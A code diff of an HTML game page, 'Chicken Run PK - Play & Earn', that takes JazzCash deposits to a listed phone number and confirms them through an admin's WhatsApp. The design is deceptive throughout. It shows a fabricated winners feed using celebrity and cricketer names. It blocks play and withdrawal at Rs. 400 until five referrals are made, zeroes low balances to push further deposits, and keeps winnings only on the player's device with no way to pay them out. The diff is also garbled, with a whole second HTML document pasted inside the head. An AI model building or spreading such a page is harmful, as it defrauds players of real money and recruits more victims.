@@ -3,6 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chicken Run PK - Play & Earn</title><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Chicken Run PK - Play & Earn</title>
     <style>
         * {
@@ -126,7 +131,7 @@
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.85);
-            display: flex;
+            display: none; /* Default hidden */
             justify-content: center;
             align-items: center;
             z-index: 1000;
@@ -224,11 +229,11 @@
 </head>
 <body>
 
-    <!-- Referral Lock Popup Modal -->
+    <!-- Referral Lock Popup Modal (Shown only if Balance >= 400 and referrals < 5) -->
     <div class="modal-overlay" id="referralModal">
         <div class="modal-box">
-            <h2>🔒 Game Locked!</h2>
-            <p>Game khelne ke liye aapko kam az kam <b>5 logon ko apne referral link se login/invite</b> karwana lazmi hai. Jab tak 5 log add nahi honge, game play nahi ho sakegi!</p>
+            <h2>🔒 Withdrawal / Game Limit Reached!</h2>
+            <p>Aapki winning <b>Rs. 400 ya usse zyada</b> ho chuki hai! Mazeed game khelne aur withdraw karne ke liye kam az kam <b>5 logon ko apne referral link se invite</b> karwana lazmi hai.</p>
             
             <div class="progress-bar-bg">
                 <div class="progress-bar-fill" id="progressFill"></div>
@@ -237,7 +242,7 @@
 
             <button class="btn" style="background: #25D366; color:#fff; width:100%; font-size:15px; margin: 8px 0;" onclick="shareReferral()">📤 Share Link on WhatsApp</button>
             <button class="btn" style="background: #ffcc00; width:100%; font-size:15px; margin: 5px 0;" onclick="checkReferralStatus()">🔄 Check Status</button>
-            <p style="font-size: 11px; color: #888; margin-top: 8px;">(Demo test ke liye aap "Check Status" par click karke check kar sakte hain)</p>
+            <p style="font-size: 11px; color: #888; margin-top: 8px;">(Demo test ke liye "Check Status" par click karke referrals barha sakte hain)</p>
         </div>
     </div>
 
@@ -293,19 +298,23 @@
     </div>
 
     <script>
-        // Referral System Logic
+        // LocalStorage Wallet Setup (Demo initial balance 100)
+        let balance = localStorage.getItem('chicken_balance') ? parseInt(localStorage.getItem('chicken_balance')) : 100;
         let referralCount = localStorage.getItem('chicken_referral_count') ? parseInt(localStorage.getItem('chicken_referral_count')) : 0;
         
-        function updateReferralUI() {
-            let percentage = (referralCount / 5) * 100;
-            if(percentage > 100) percentage = 100;
-            document.getElementById('progressFill').style.width = percentage + '%';
-            document.getElementById('progressText').innerText = referralCount + ' / 5 Referrals Completed';
+        document.getElementById('userBalance').innerText = 'Rs. ' + balance;
 
-            if (referralCount >= 5) {
-                document.getElementById('referralModal').style.display = 'none';
-            } else {
+        function checkGameLockCondition() {
+            // Agar balance Rs. 400 ya usse zyada hai AUR referrals 5 se kam hain, toh game lock ho gi
+            if (balance >= 400 && referralCount < 5) {
+                let percentage = (referralCount / 5) * 100;
+                document.getElementById('progressFill').style.width = percentage + '%';
+                document.getElementById('progressText').innerText = referralCount + ' / 5 Referrals Completed';
                 document.getElementById('referralModal').style.display = 'flex';
+                return true; // Locked
+            } else {
+                document.getElementById('referralModal').style.display = 'none';
+                return false; // Unlocked
             }
         }
 
@@ -317,21 +326,24 @@
         }
 
         function checkReferralStatus() {
-            // Testing ke liye jab user click karega toh referrals barhein ge (Aap real backend/database ke sath isay replace kar sakte hain)
             if (referralCount < 5) {
                 referralCount++;
                 localStorage.setItem('chicken_referral_count', referralCount);
-                updateReferralUI();
+                let percentage = (referralCount / 5) * 100;
+                document.getElementById('progressFill').style.width = percentage + '%';
+                document.getElementById('progressText').innerText = referralCount + ' / 5 Referrals Completed';
+
                 if(referralCount >= 5) {
                     alert("🎉 Mubarak ho! Aapke 5 referrals mukammal ho gaye hain. Ab aap game play kar sakte hain!");
+                    document.getElementById('referralModal').style.display = 'none';
                 } else {
                     alert(`Mazeed ${5 - referralCount} logoon ko invite karein taake game unlock ho jaye.`);
                 }
             }
         }
 
-        // Page load par referral status check karein
-        updateReferralUI();
+        // Initial check on load
+        checkGameLockCondition();
 
         // JazzCash Account Copy & Direct Instruction Function
         function copyAndPromptJazzCash() {
@@ -436,10 +448,6 @@
 
         generateWinnersList();
 
-        // LocalStorage Wallet Setup
-        let balance = localStorage.getItem('chicken_balance') ? parseInt(localStorage.getItem('chicken_balance')) : 100;
-        document.getElementById('userBalance').innerText = 'Rs. ' + balance;
-
         const canvas = document.getElementById('gameCanvas');
         const ctx = canvas.getContext('2d');
 
@@ -468,10 +476,7 @@
         };
 
         function makeJump() {
-            if (referralCount < 5) {
-                alert("Pehle 5 referrals mukammal karein!");
-                return;
-            }
+            if (checkGameLockCondition()) return;
             if (!gameStarted || isPaused || isGameOver) return;
 
             if (chicken.grounded) {
@@ -481,9 +486,8 @@
         }
 
         function startGame() {
-            if (referralCount < 5) {
-                alert("Game play karne ke liye 5 logon ko refer karna lazmi hai!");
-                document.getElementById('referralModal').style.display = 'flex';
+            if (checkGameLockCondition()) {
+                alert("Aapka balance Rs. 400 ya usse zyada hai. Pehle 5 referrals mukammal karein!");
                 return;
             }
 
@@ -500,7 +504,7 @@
         }
 
         function togglePause() {
-            if (referralCount < 5 || !gameStarted || isGameOver) return;
+            if (checkGameLockCondition() || !gameStarted || isGameOver) return;
             
             isPaused = !isPaused;
             let pauseBtn = document.getElementById('pauseBtn');
@@ -554,6 +558,641 @@
 
             localStorage.setItem('chicken_balance', balance);
             document.getElementById('userBalance').innerText = 'Rs. ' + balance;
+
+            // Check if earnings reached 400 after game over
+            checkGameLockCondition();
+        }
+
+        function draw() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            // Ground
+            ctx.fillStyle = '#333';
+            ctx.fillRect(0, 200, canvas.width, 50);
+
+            // Chicken
+            ctx.font = '28px Arial';
+            ctx.fillText('🐔', chicken.x - 4, chicken.y + 24);
+
+            // Obstacle
+            ctx.fillStyle = '#ff4444';
+            ctx.fillRect(obstacle.x, obstacle.y, obstacle.width, obstacle.height);
+
+            // Initial Start Screen Overlay
+            if (!gameStarted) {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#fff';
+                ctx.font = '18px Arial';
+                ctx.fillText('Click "Start Game" to Play', 95, 120);
+            }
+
+            // Pause Screen Overlay
+            if (isPaused) {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#ffcc00';
+                ctx.font = '22px Arial';
+                ctx.fillText('Game Paused', 130, 130);
+            }
+
+            // Game Over Screen Overlay
+            if (isGameOver) {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#fff';
+                ctx.font = '16px Arial';
+                let earnedReward = Math.floor(score / 10);
+                ctx.fillText(`Game Over! Earned: Rs. ${earnedReward}`, 60, 90);
+                if (balance === 0) {
+                    ctx.fillStyle = '#ff4444';
+                    ctx.fillText('Balance Expired (Rs. 0)! Please Deposit.', 45, 120);
+                }
+                ctx.fillStyle = '#fff';
+                ctx.fillText('Click Start Game to Retry', 95, 150);
+            }
+        }
+
+        function loop() {
+            update();
+            draw();
+            requestAnimationFrame(loop);
+        }
+
+        loop();
+
+        // TID & WhatsApp Submission Logic
+        function submitTID() {
+            let amount = document.getElementById('depositAmount').value.trim();
+            let tid = document.getElementById('tidInput').value.trim();
+
+            if (!amount || !tid) {
+                alert('Please enter both Amount and Transaction ID (TID)!');
+                return;
+            }
+
+            let adminPhone = '923034902887'; 
+            let message = `Hello Admin, I have sent Rs. ${amount} via JazzCash to your account (03034902887).%0ATID: ${tid}%0APlease verify and add balance to my account.`;
+            let whatsappURL = `https://wa.me/${adminPhone}?text=${message}`;
+
+            window.open(whatsappURL, '_blank');
+        }
+    </script>
+</body>
+</html>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #1a1a1a;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+        }
+        header {
+            background: #222;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+        }
+        h1 {
+            color: #ffcc00;
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        .wallet-box {
+            background: #333;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px auto;
+            max-width: 400px;
+            display: flex;
+            justify-content: space-around;
+            font-size: 16px;
+        }
+        .wallet-box span {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        .game-container {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            height: 250px;
+            background: #2b2b2b;
+            margin: 0 auto;
+            border: 3px solid #ffcc00;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        canvas {
+            display: block;
+            background: linear-gradient(to bottom, #4a90e2, #50e3c2);
+            width: 100%;
+            height: 100%;
+        }
+        .btn {
+            background: #ffcc00;
+            color: #000;
+            border: none;
+            padding: 12px 20px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px 5px;
+            width: 90%;
+            max-width: 400px;
+        }
+        .btn:active {
+            background: #e6b800;
+        }
+        .control-panel {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 10px auto;
+            max-width: 400px;
+        }
+        .ctrl-btn {
+            flex: 1;
+            padding: 10px;
+            font-size: 14px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        #startBtn { background: #4CAF50; color: #fff; }
+        #pauseBtn { background: #ff9800; color: #fff; }
+        .section {
+            background: #252525;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px auto;
+            max-width: 400px;
+            text-align: left;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+        .section h3 {
+            color: #ffcc00;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background: #1a1a1a;
+            color: #fff;
+        }
+        
+        /* Modal Popup Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: none; /* Default hidden */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .modal-box {
+            background: #222;
+            border: 2px solid #ffcc00;
+            padding: 20px;
+            border-radius: 12px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.7);
+        }
+        .modal-box h2 {
+            color: #ffcc00;
+            margin-bottom: 10px;
+            font-size: 20px;
+        }
+        .modal-box p {
+            font-size: 14px;
+            color: #ddd;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+        .progress-bar-bg {
+            background: #444;
+            border-radius: 10px;
+            height: 20px;
+            width: 100%;
+            margin: 15px 0;
+            overflow: hidden;
+            position: relative;
+        }
+        .progress-bar-fill {
+            background: #4CAF50;
+            height: 100%;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+        .progress-text {
+            position: absolute;
+            width: 100%;
+            top: 0;
+            left: 0;
+            font-size: 12px;
+            font-weight: bold;
+            color: #fff;
+            line-height: 20px;
+        }
+
+        /* Winners Ticker Styling */
+        .winners-ticker {
+            background: #1f1f1f;
+            border: 2px dashed #4CAF50;
+            border-radius: 8px;
+            margin: 15px auto;
+            max-width: 400px;
+            padding: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        .winners-ticker h4 {
+            color: #4CAF50;
+            margin-bottom: 5px;
+            font-size: 14px;
+            text-align: center;
+        }
+        .marquee-container {
+            height: 40px;
+            overflow: hidden;
+            position: relative;
+        }
+        .marquee-content {
+            position: absolute;
+            width: 100%;
+            animation: scrollUp 40s linear infinite;
+        }
+        .winner-item {
+            font-size: 13px;
+            padding: 4px 0;
+            color: #ddd;
+            text-align: center;
+        }
+        .winner-item span {
+            color: #ffcc00;
+            font-weight: bold;
+        }
+        @keyframes scrollUp {
+            0% { top: 100%; }
+            100% { top: -750%; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Referral Lock Popup Modal (Shown only if Balance >= 400 and referrals < 5) -->
+    <div class="modal-overlay" id="referralModal">
+        <div class="modal-box">
+            <h2>🔒 Withdrawal / Game Limit Reached!</h2>
+            <p>Aapki winning <b>Rs. 400 ya usse zyada</b> ho chuki hai! Mazeed game khelne aur withdraw karne ke liye kam az kam <b>5 logon ko apne referral link se invite</b> karwana lazmi hai.</p>
+            
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill" id="progressFill"></div>
+                <div class="progress-text" id="progressText">0 / 5 Referrals Completed</div>
+            </div>
+
+            <button class="btn" style="background: #25D366; color:#fff; width:100%; font-size:15px; margin: 8px 0;" onclick="shareReferral()">📤 Share Link on WhatsApp</button>
+            <button class="btn" style="background: #ffcc00; width:100%; font-size:15px; margin: 5px 0;" onclick="checkReferralStatus()">🔄 Check Status</button>
+            <p style="font-size: 11px; color: #888; margin-top: 8px;">(Demo test ke liye "Check Status" par click karke referrals barha sakte hain)</p>
+        </div>
+    </div>
+
+    <header>
+        <h1>🐔 Chicken Run PK</h1>
+        <p>Play Game & Deposit via TID</p>
+    </header>
+
+    <div class="wallet-box">
+        <div>Balance: <span id="userBalance">Rs. 0</span></div>
+        <div>Score: <span id="currentScore">0</span></div>
+    </div>
+
+    <!-- Game Area -->
+    <div class="game-container">
+        <canvas id="gameCanvas" width="400" height="250"></canvas>
+    </div>
+
+    <!-- Game Control Buttons -->
+    <div class="control-panel" style="max-width: 400px; margin: 10px auto;">
+        <button class="ctrl-btn" id="startBtn" onclick="startGame()">Start Game</button>
+        <button class="ctrl-btn" id="pauseBtn" onclick="togglePause()">Pause</button>
+    </div>
+
+    <button class="btn" id="jumpBtn" onclick="makeJump()">JUMP (TAP HERE)</button>
+
+    <!-- Quick JazzCash Deposit Button (Rs. 100) -->
+    <div style="max-width: 400px; margin: 10px auto;">
+        <button class="btn" style="background: #e60000; color: #fff; width: 100%; font-size: 16px;" onclick="copyAndPromptJazzCash()">🚀 Fast Deposit Rs. 100 (Copy JazzCash)</button>
+    </div>
+
+    <!-- Live Winners Ticker List -->
+    <div class="winners-ticker">
+        <h4>🔴 Live Winners Feed</h4>
+        <div class="marquee-container">
+            <div class="marquee-content" id="winnersList">
+                <!-- JavaScript se names yahan insert honge -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Deposit & TID Section -->
+    <div class="section">
+        <h3>JazzCash Deposit Verification</h3>
+        <p style="font-size: 13px; margin-bottom: 3px;">Send payment to JazzCash Account:</p>
+        <p style="font-size: 16px; color: #ffcc00; text-align: center; font-weight: bold; margin-bottom: 8px;">03034902887</p>
+        <p style="font-size: 12px; color: #aaa; margin-bottom: 8px;">Payment ke baad apni TID yahan enter karein:</p>
+        
+        <input type="number" id="depositAmount" placeholder="Enter Amount (e.g. 500)" value="100">
+        <input type="text" id="tidInput" placeholder="Enter Transaction ID (TID)">
+        
+        <button class="btn" style="width:100%; margin: 5px 0; background: #25D366; color: #fff;" onclick="submitTID()">Verify via WhatsApp</button>
+    </div>
+
+    <script>
+        // LocalStorage Wallet Setup (Demo initial balance 100)
+        let balance = localStorage.getItem('chicken_balance') ? parseInt(localStorage.getItem('chicken_balance')) : 100;
+        let referralCount = localStorage.getItem('chicken_referral_count') ? parseInt(localStorage.getItem('chicken_referral_count')) : 0;
+        
+        document.getElementById('userBalance').innerText = 'Rs. ' + balance;
+
+        function checkGameLockCondition() {
+            // Agar balance Rs. 400 ya usse zyada hai AUR referrals 5 se kam hain, toh game lock ho gi
+            if (balance >= 400 && referralCount < 5) {
+                let percentage = (referralCount / 5) * 100;
+                document.getElementById('progressFill').style.width = percentage + '%';
+                document.getElementById('progressText').innerText = referralCount + ' / 5 Referrals Completed';
+                document.getElementById('referralModal').style.display = 'flex';
+                return true; // Locked
+            } else {
+                document.getElementById('referralModal').style.display = 'none';
+                return false; // Unlocked
+            }
+        }
+
+        function shareReferral() {
+            let refLink = window.location.href.split('?')[0] + "?ref=user_" + Math.floor(Math.random() * 100000);
+            let message = `🔥 Chicken Run PK game khelein aur paise jeetein! Mera link join karein: ${refLink}`;
+            let whatsappURL = `https://wa.me/?text=` + encodeURIComponent(message);
+            window.open(whatsappURL, '_blank');
+        }
+
+        function checkReferralStatus() {
+            if (referralCount < 5) {
+                referralCount++;
+                localStorage.setItem('chicken_referral_count', referralCount);
+                let percentage = (referralCount / 5) * 100;
+                document.getElementById('progressFill').style.width = percentage + '%';
+                document.getElementById('progressText').innerText = referralCount + ' / 5 Referrals Completed';
+
+                if(referralCount >= 5) {
+                    alert("🎉 Mubarak ho! Aapke 5 referrals mukammal ho gaye hain. Ab aap game play kar sakte hain!");
+                    document.getElementById('referralModal').style.display = 'none';
+                } else {
+                    alert(`Mazeed ${5 - referralCount} logoon ko invite karein taake game unlock ho jaye.`);
+                }
+            }
+        }
+
+        // Initial check on load
+        checkGameLockCondition();
+
+        // JazzCash Account Copy & Direct Instruction Function
+        function copyAndPromptJazzCash() {
+            let accountNo = "03034902887";
+            
+            navigator.clipboard.writeText(accountNo).then(function() {
+                alert("JazzCash Account Number (03034902887) copied successfully!\n\n1. Apni JazzCash App kholein.\n2. Rs. 100 is number par send karein.\n3. Jo TID (Transaction ID) milegi usay neche enter karke WhatsApp par verify karwayein.");
+            }, function() {
+                alert("JazzCash Account: 03034902887\nAap apni JazzCash app open karke is number par Rs. 100 send karein aur TID niche enter karein.");
+            });
+        }
+
+        // Winners Data List
+        const winnersData = [
+            { name: "Mobila Muzammil", amount: 200 },
+            { name: "Zubair Gujjar", amount: 150 },
+            { name: "Salman Butt", amount: 350 },
+            { name: "Kashif Mehmood", amount: 50 },
+            { name: "Nadeem Qureshi", amount: 450 },
+            { name: "Rehan Mughal", amount: 250 },
+            { name: "Tariq Jameel", amount: 500 },
+            { name: "Adeel Malik", amount: 120 },
+            { name: "Shehryar Khan", amount: 300 },
+            { name: "Yasir Arafat", amount: 180 },
+            { name: "Ali Raza", amount: 500 },
+            { name: "Usman Khan", amount: 1000 },
+            { name: "Bilal Ahmed", amount: 300 },
+            { name: "Hamza Ali", amount: 2000 },
+            { name: "Zainab Bibi", amount: 400 },
+            { name: "Awais Qarni", amount: 1500 },
+            { name: "Faizan Shah", amount: 5000 },
+            { name: "Ayesha Malik", amount: 750 },
+            { name: "Danyal Sheikh", amount: 1200 },
+            { name: "Haris Rauf", amount: 2500 },
+            { name: "Kamran Akmal", amount: 3000 },
+            { name: "Shoaib Malik", amount: 4000 },
+            { name: "Babar Azam", amount: 5000 },
+            { name: "Mohammad Rizwan", amount: 3000 },
+            { name: "Shaheen Afridi", amount: 2500 },
+            { name: "Naseem Shah", amount: 1000 },
+            { name: "Fakhar Zaman", amount: 500 },
+            { name: "Imam-ul-Haq", amount: 400 },
+            { name: "Shadab Khan", amount: 1500 },
+            { name: "Hassan Ali", amount: 200 },
+            { name: "Sarfaraz Ahmed", amount: 1200 },
+            { name: "Asif Ali", amount: 300 },
+            { name: "Haider Ali", amount: 1000 },
+            { name: "Khushdil Shah", amount: 750 },
+            { name: "Usman Qadir", amount: 500 },
+            { name: "Zahid Mahmood", amount: 400 },
+            { name: "Mohammad Nawaz", amount: 2000 },
+            { name: "Iftikhar Ahmed", amount: 3000 },
+            { name: "Shan Masood", amount: 1500 },
+            { name: "Abdullah Shafique", amount: 500 },
+            { name: "Saud Shakeel", amount: 1000 },
+            { name: "Agha Salman", amount: 2500 },
+            { name: "Mohammad Wasim", amount: 400 },
+            { name: "Mir Hamza", amount: 300 },
+            { name: "Sajid Khan", amount: 750 },
+            { name: "Nauman Ali", amount: 1200 },
+            { name: "Abid Ali", amount: 200 },
+            { name: "Azhar Ali", amount: 1500 },
+            { name: "Yasir Shah", amount: 3000 },
+            { name: "Wahab Riaz", amount: 5000 },
+            { name: "Mohammad Amir", amount: 4000 },
+            { name: "Imad Wasim", amount: 2000 },
+            { name: "Sohail Tanvir", amount: 500 },
+            { name: "Kamran Ghulam", amount: 1000 },
+            { name: "Omair Yousuf", amount: 300 },
+            { name: "Qasim Akram", amount: 750 },
+            { name: "Haseebullah", amount: 1200 },
+            { name: "Zohaib Khan", amount: 1500 },
+            { name: "Fahad Mustafa", amount: 2500 },
+            { name: "Atif Aslam", amount: 5000 },
+            { name: "Ali Zafar", amount: 3000 },
+            { name: "Bilal Saeed", amount: 400 },
+            { name: "Farhan Saeed", amount: 1000 },
+            { name: "Shehzad Roy", amount: 500 },
+            { name: "Aima Baig", amount: 750 },
+            { name: "Momina Mustehsan", amount: 2000 },
+            { name: "Rahat Fateh", amount: 5000 },
+            { name: "Sahir Lodhi", amount: 300 },
+            { name: "Waseem Badami", amount: 1200 },
+            { name: "Fakhar-e-Alam", amount: 1500 },
+            { name: "Iqrar ul Hassan", amount: 2500 },
+            { name: "Noman Ejaz", amount: 1000 },
+            { name: "Faysal Quraishi", amount: 500 },
+            { name: "Humayun Saeed", amount: 3000 },
+            { name: "Adnan Siddiqui", amount: 4000 },
+            { name: "Sami Khan", amount: 750 },
+            { name: "Muneeb Butt", amount: 200 }
+        ];
+
+        function generateWinnersList() {
+            let tickerHTML = '';
+            for (let i = 0; i < winnersData.length; i++) {
+                let winner = winnersData[i];
+                tickerHTML += `<div class="winner-item">🎉 <span>${winner.name}</span> won <span>Rs. ${winner.amount}</span></div>`;
+            }
+            document.getElementById('winnersList').innerHTML = tickerHTML;
+        }
+
+        generateWinnersList();
+
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+
+        let score = 0;
+        let gravity = 0.6;
+        let gameStarted = false;
+        let isPaused = false;
+        let isGameOver = false;
+
+        let chicken = {
+            x: 50,
+            y: 170,
+            width: 30,
+            height: 30,
+            dy: 0,
+            jumpPower: -10,
+            grounded: true
+        };
+
+        let obstacle = {
+            x: 400,
+            y: 175,
+            width: 20,
+            height: 25,
+            speed: 5
+        };
+
+        function makeJump() {
+            if (checkGameLockCondition()) return;
+            if (!gameStarted || isPaused || isGameOver) return;
+
+            if (chicken.grounded) {
+                chicken.dy = chicken.jumpPower;
+                chicken.grounded = false;
+            }
+        }
+
+        function startGame() {
+            if (checkGameLockCondition()) {
+                alert("Aapka balance Rs. 400 ya usse zyada hai. Pehle 5 referrals mukammal karein!");
+                return;
+            }
+
+            gameStarted = true;
+            isPaused = false;
+            isGameOver = false;
+            score = 0;
+            document.getElementById('currentScore').innerText = score;
+            document.getElementById('pauseBtn').innerText = 'Pause';
+            obstacle.x = 400;
+            obstacle.speed = 5;
+            chicken.y = 170;
+            chicken.dy = 0;
+        }
+
+        function togglePause() {
+            if (checkGameLockCondition() || !gameStarted || isGameOver) return;
+            
+            isPaused = !isPaused;
+            let pauseBtn = document.getElementById('pauseBtn');
+            if (isPaused) {
+                pauseBtn.innerText = 'Resume';
+            } else {
+                pauseBtn.innerText = 'Pause';
+            }
+        }
+
+        function update() {
+            if (!gameStarted || isPaused || isGameOver) return;
+
+            chicken.dy += gravity;
+            chicken.y += chicken.dy;
+
+            if (chicken.y > 170) {
+                chicken.y = 170;
+                chicken.dy = 0;
+                chicken.grounded = true;
+            }
+
+            obstacle.x -= obstacle.speed;
+            if (obstacle.x < -20) {
+                obstacle.x = 400;
+                score += 10;
+                document.getElementById('currentScore').innerText = score;
+                if(score % 50 === 0) obstacle.speed += 0.5;
+            }
+
+            // Collision detection
+            if (
+                chicken.x < obstacle.x + obstacle.width &&
+                chicken.x + chicken.width > obstacle.x &&
+                chicken.y < obstacle.y + obstacle.height &&
+                chicken.y + chicken.height > obstacle.y
+            ) {
+                isGameOver = true;
+                handleGameOverEarnings();
+            }
+        }
+
+        function handleGameOverEarnings() {
+            let earnedReward = Math.floor(score / 10);
+            balance += earnedReward;
+
+            if (balance <= 30) {
+                balance = 0;
+                alert('Demo Balance Expired! Balance dropped to Rs. 30 or below. Please deposit via JazzCash to continue playing.');
+            }
+
+            localStorage.setItem('chicken_balance', balance);
+            document.getElementById('userBalance').innerText = 'Rs. ' + balance;
+
+            // Check if earnings reached 400 after game over
+            checkGameLockCondition();
         }
 
         function draw() {
